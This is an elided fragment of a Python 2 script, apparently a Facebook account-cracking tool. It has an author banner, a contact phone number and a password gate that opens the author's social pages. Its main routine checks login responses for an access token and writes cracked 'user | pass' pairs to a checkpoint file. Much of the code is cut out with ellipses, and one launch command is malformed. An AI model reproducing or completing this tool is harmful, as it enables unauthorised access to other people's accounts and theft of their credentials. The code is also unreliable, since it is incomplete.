...
\_/\_\\_/\_\\____/\____/
  ...
  Auther  :  MR RAKOB                                Github  :  MRRAKIB-404
  Whapp   :  0531382117
...
while loop == 'true':
    ...
    if username == CorrectUsername:
        ...
        if password == CorrectPassword:
            ...
            os.system('xdg-openhttps://github.com/MRRAKIB-404')
    else:
        print '\x1b[1;91mWrong!,\x1b[1;92mText me to get the correct username'
        os.system('xdg-open www.https://www.facebook.com/Itz.AriYaN.Sakib.Take.love')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '[RRSB(CP) Login After 3 Days] ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('RAKIB/checkpoint.txt', 'a')
